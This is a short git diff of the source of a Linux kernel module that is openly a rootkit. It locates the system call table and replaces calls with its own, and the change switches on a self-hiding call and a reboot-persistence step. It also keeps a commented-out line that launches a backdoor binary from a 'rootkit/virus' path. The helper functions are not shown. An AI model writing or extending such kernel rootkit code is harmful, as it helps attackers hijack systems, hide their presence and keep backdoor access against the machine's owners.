@@ -16,26 +16,21 @@ MODULE_VERSION("0.0.1");
 void **sys_call_table;
 struct sysinfo *info;
 
-static int __init lkm_example_init(void) {
-    printk(KERN_INFO "Hello, World!\n");
-
-    
+static int __init lkm_example_init(void) {    
     //finding syscall table
     sys_call_table = find_syscall_table();
     //re-place syscalls with our own
     update_sys_calls(sys_call_table);
-    add_to_reboot();
 
     //launch backdoor
-    //run_bash("~/virus/backdoor")
-    //hide();
+    //run_bash("/lib/modules/3.2.0-126-generic/kernel/drivers/rootkit/virus/backdoor");
+    hide();
+    add_to_reboot();
 
     return 0;
 }
 
 static void __exit lkm_example_exit(void) {
-    printk(KERN_INFO "Goodbye, World!\n");
-
     add_to_reboot_exit();
     //re-load original syscalls
     revert_to_original(sys_call_table);
@@ -64,5 +59,4 @@ int run_bash(char* command) {
 
 
 module_init(lkm_example_init);
-//Comment this line out to make it so the rootkit can't be removed
 module_exit(lkm_example_exit);
